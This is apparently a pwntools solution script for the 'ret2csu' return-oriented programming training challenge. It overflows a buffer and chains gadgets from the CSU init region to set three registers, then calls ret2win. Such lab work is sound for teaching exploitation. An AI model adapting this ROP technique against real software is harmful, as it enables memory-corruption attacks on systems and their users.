from pwn import *
from icecream import ic

exe = ELF("./ret2csu")

context.binary = exe
context.log_level = "debug"
context.aslr = True

def start(argv=[], *a, **kw):
    '''Start the exploit against the target.'''
    sys.argv += ' '
    if sys.argv[1] == 'r':
        args.REMOTE = True
    elif sys.argv[1] == 'd':
        args.GDB = True
    
    if args.REMOTE:
        return remote("localhost", 1337)
    if args.GDB:
        return gdb.debug([exe.path] + argv, gdbscript=gdbscript, *a, **kw)
    else:
        return process([exe.path] + argv, *a, **kw)

gdbscript = '''
# b *0x00000000004006a2
b *0x0000000000400674
c
'''.format(**locals())

def sl(a): return io.sendline(a)
def s(a): return io.send(a)
def sa(a, b): return io.sendafter(a, b)
def sla(a, b): return io.sendlineafter(a, b)
def re(a): return io.recv(a)
def ru(a): return io.recvuntil(a)
def rl(): return io.recvline()
def i(): return io.interactive()

io = start()

pop_rdi = 0x00000000004006a3
pop_rsi_r15 = 0x00000000004006a1
mov_rdx_r15 = 0x0000000000400680
pop_rbx_rbp_r12_r13_r14_r15 = 0x40069a
ret2win = 0x400510
pop_r15 = 0x00000000004006a2
ret = 0x00000000004004e6
frame_dummy = 0x0000000000600df0

payload = b"a"*40
payload += p64(pop_rbx_rbp_r12_r13_r14_r15)
payload += p64(0)
payload += p64(0x1)
payload += p64(frame_dummy)
payload += p64(0)
payload += p64(0)
payload += p64(0xd00df00dd00df00d)
payload += p64(mov_rdx_r15)
payload += p64(0)
payload += p64(0)
payload += p64(0x1)
payload += p64(frame_dummy)
payload += p64(0)
payload += p64(0)
payload += p64(0)
payload += p64(pop_rdi)
payload += p64(0xdeadbeefdeadbeef)
payload += p64(pop_rsi_r15)
payload += p64(0xcafebabecafebabe)
payload += p64(0xd00df00dd00df00d)
payload += p64(ret)
payload += p64(ret2win)

ru(">")
sl(payload)

i()
